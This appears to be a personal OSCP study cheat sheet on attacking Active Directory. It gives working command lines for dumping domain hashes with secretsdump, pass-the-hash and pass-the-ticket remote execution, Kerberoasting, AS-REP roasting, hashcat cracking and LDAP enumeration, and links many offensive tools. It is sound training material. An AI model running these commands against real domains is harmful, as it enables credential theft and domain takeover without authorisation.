# Active Directory Cheatsheet     
## Active Directory Overview 
To gain control over a domain:  
Compromise member of Domain Admin group.   
Compromise domain controller -> can modify all domain-joined computers or execute applications on them. 

AD: depends on DNS server, typical DC hosts DNS server that is authoritative for a given domain. 
Authentication mechanisms: Kerberos or NTLM 

Typical AD pen test:
- Exploit host on domain and gain access  as a domain user 
- Enumerate domain users and groups.  
- Privilege escalate or move laterally. 
- Get Domain Admin or Service Account access and onto the domain controller. 

## AD Cheatsheets
[Enumeration](https://github.com/Scr1ptK1ddie/OSCPprep/blob/main/ActiveDirectory/Enumeration.md)    
 

## Resources      
[WADComs](https://wadcoms.github.io/)    

## Other Cheat Sheets
[AD Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)     
[AD Lateral Movement and Persistence Cheatsheet](https://bhanusnotes.blogspot.com/2020/12/ad-pentest-lateral-movement-persistance.html)  
[AD Cheat sheet](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)   
[Pentesting AD CheatSheet](https://i.ibb.co/TKYNCNP/Pentest-ad.png)  
[Integratio IT Cheat Sheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)  

    
### Important Files to Check on the DC
    %SYSTEMROOT%\System32\ntds.dit             #AD database
    %SYSTEMROOT%\NTDS\ntds.dit                 #AD backup

## Tools  
### Tools allowed on the new exam 
All tools that do not perform any restricted actions are allowed on the exam (no commercial tools like Burp Pro, no automated exploits like SQLmap, etc).   

    [BloodHound](https://github.com/BloodHoundAD/BloodHound)     
    [SharpHound](https://github.com/BloodHoundAD/SharpHound)    
    [PowerShell Empire](https://github.com/BC-SECURITY/Empire)    
    Covenant 
    Powerview
    Rubeus
    [evil-winrm](https://github.com/nubix/evil-winrm): access Windows RM, TCP port 5985 or 5986 open.   
    Responder (Spoofing is not allowed in the labs or on the exam)
    Crackmapexec
    Mimikatz

## General Tools 

[Impacket](https://github.com/SecureAuthCorp/impacket): collection on Python classes for working with network protocols.       

    #if not properly installed 
    apt install impacket-scripts  
    /usr/share/doc/python3-impacket/examples  
    
[ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   

## NTLM Authentication
### Impacket Scripts  
psexec.py, smbexec.py, wmiexec.py   
If you have creds for the backup account for domain controller: can dump all hashes    

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
    
Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't need to be cracked)    

    python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183    
    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]  

## Kerberos (Port 88)   
Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
[keko](https://github.com/gentilkiwi/kekeo): Kerberos scripts     
[Messing With Kerberos Using Rubeus](https://endark.gitbook.io/kb/windows/lab-attacks/messing-with-kerberos-using-rubeus) 
[Kerberos Tickets](https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel)   
[Kerberos Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  
[How Kerberos Works](https://www.tarlogic.com/blog/how-kerberos-works/)  


    ./kerbrute userenum userlist.txt -d [name] --dc [name]     
    
## Kerberos Attacks 
Kerbrute Enumeration (No domain access needed)     
Kerberoasting (Access as any user needed)    
AS-REP Roasting with Rubeus and Impacket (Access as any user needed)     
Overpass the Hash / Pass the Key (PTK)     
Pass the Ticket (Access to user on the domain needed)     
Golden/Silver Ticket Attacks (Domain admin needed / Service hash needed)    
Skeleton key attacks using mimikatz (Domain Admin needed)    

### Kerbrute Enumeration 
No domain access needed 

Kerbrute: https://github.com/ropnop/kerbrute
/usr/share/wordlists/ADUsers.txt

### Kerberoasting  
Check for Kerberoasting with Impacket -> SPNs 

    GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john

Kerberoasting with Impacket

    python3 GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>  
    sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip <ip> -request
     
 Kerberoasting with Rubeus (install on Windows host in domain) 
 
    rubeus.exe kerberoast 
 
Crack passwords with hashcat 

    hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/ADPass.txt
    13100: kerberos 5, 0: straight attack mode

### AS-REP Roasting with Rubeus and Impacket
Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
     

ASREPRoast with Impacket:

    impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
    impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

ASREP Roast with Rubeus:

### Golden / Silver Ticket Attacks: 

### Overpass The Hash/Pass The Key (PTK):
Impacket 

    python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
    python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
    python3 getTGT.py <domain_name>/<user_name>:[password]

### Pass the Ticket 
Using TGT key to execute remote commands from the following impacket scripts:

    python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
    python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
    python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

### Skeleton Key Attacks using Mimikatz 

## LDAP (Port 636)
Anonymous Credential LDAP Dumping: 

    ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’

Impacket GetADUsers.py (Must have valid credentials)

    GetADUsers.py -all <domain\User> -dc-ip <DC_IP>

Impacket lookupsid.py:

    /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0

Impacket Secretdump:

    python3 secretdump.py 'breakme.local/Administrator@172.21.0.0' -just-dc-user anakin

Windapsearch:

https://github.com/ropnop/windapsearch 

    python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U
   

 
 
# Resources
[Active Directory Security 101 Class](https://github.com/cfalta/adsec) 

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
 
[Understanding Windows Lateral Movement](https://attl4s.github.io/assets/pdf/Understanding_Windows_Lateral_Movements.pdf)  

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)

[Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)

[Active Directory Enumeration | ATTL4S](https://attl4s.github.io/assets/pdf/Understanding_Active_Directory_Enumeration.pdf) 

[Adsecurity Blog](https://adsecurity.org/) 

[RedTeam Security Live Hacking Demonstration](https://www.youtube.com/watch?v=k6EOhO3JKCQ) 

[NetNTLMtoSilverTicket | NotMedic's Github](https://github.com/NotMedic/NetNTLMtoSilverTicket) 
